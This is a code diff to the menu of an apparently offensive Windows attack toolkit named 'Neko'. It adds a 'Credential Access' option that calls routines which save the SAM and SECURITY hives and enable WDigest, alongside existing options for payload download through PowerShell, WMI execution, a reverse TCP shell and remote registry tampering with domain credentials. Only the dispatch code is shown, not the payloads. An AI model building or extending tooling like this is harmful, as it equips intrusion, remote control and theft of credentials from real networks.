@@ -10,12 +10,13 @@ namespace Neko.UserChoices
         {
             // Prompt user decision on recon or deployment via WMI
             Console.WriteLine("\r\nNeko Attack Options: \r\n\r\n 1: Discovery \r\n\r\n 2: Installation \r\n\r\n 3: Execution via WMI \r\n\r\n 4: Command and Control" +
-                "\r\n\r\n 5: Remote Registry Tampering");
+                "\r\n\r\n 5: Remote Registry Tampering \r\n\r\n 6: Credential Access");
             Console.WriteLine("\r\nMake your selection:");
             attackType = Console.ReadLine();
-            while (attackType != "1" && attackType != "2" && attackType != "3" && attackType != "4")
+            while (attackType != "1" && attackType != "2" && attackType != "3" && attackType != "4" && attackType!= "5" && attackType != "6")
             {
-                Console.WriteLine("\r\nInvalid selection. Enter '1' for Recon, '2' Deployment via WMI:");
+                Console.WriteLine("\r\nInvalid selection. 1: Discovery \r\n\r\n 2: Installation \r\n\r\n 3: Execution via WMI \r\n\r\n 4: Command and Control" +
+                "\r\n\r\n 5: Remote Registry Tampering \r\n\r\n 6: Credential Access");
                 attackType = Console.ReadLine();
             }
 
@@ -26,32 +27,30 @@ namespace Neko.UserChoices
             return attackType;
         }
 
+        // Launch specified attack
         public static void LaunchAttack(string attackType)
         {
-            // Discovery
-            if (attackType == "1")
+            switch (attackType)
             {
-                DiscoveryChoice.Selections();
-            }
-            // Installation of payload via PowerShell + WMI with obfuscation options
-            else if (attackType == "2")
-            {
-                Delivery.PowerShell.DownloadFile();
-            }
-            // User choice to deploy via WMI
-            else if (attackType == "3")
-            {
-                Execution.WMIDeployment.Deploy();
-            }
-            // C2 via Reverse TCP Shell
-            else if (attackType == "4")
-            {
-                Command_and_Control.ReverseTCPShell.Control();
-            }
-            // Remote registry tampering
-            else if (attackType == "5")
-            {
-                RemoteRegistry.RegModification(Exfiltration.SaveLocations.NekoFolder, GetDomainInfo.DomainURL, DomainAuthentication.Username, DomainAuthentication.Password);
+                case "1":
+                    DiscoveryChoice.Selections();
+                    break;
+                case "2":
+                    Delivery.PowerShell.DownloadFile();
+                    break;
+                case "3":
+                    Execution.WMIDeployment.Deploy();
+                    break;
+                case "4":
+                    Command_and_Control.ReverseTCPShell.Control();
+                    break;
+                case "5":
+                    RemoteRegistry.RegModification(Exfiltration.SaveLocations.NekoFolder, GetDomainInfo.DomainURL, DomainAuthentication.Username, DomainAuthentication.Password);
+                    break;
+                case "6":
+                    Credential_Access.Selections.SaveSAMSecurity();
+                    Credential_Access.Selections.EnableWDigest();
+                    break;
             }
         }
     }
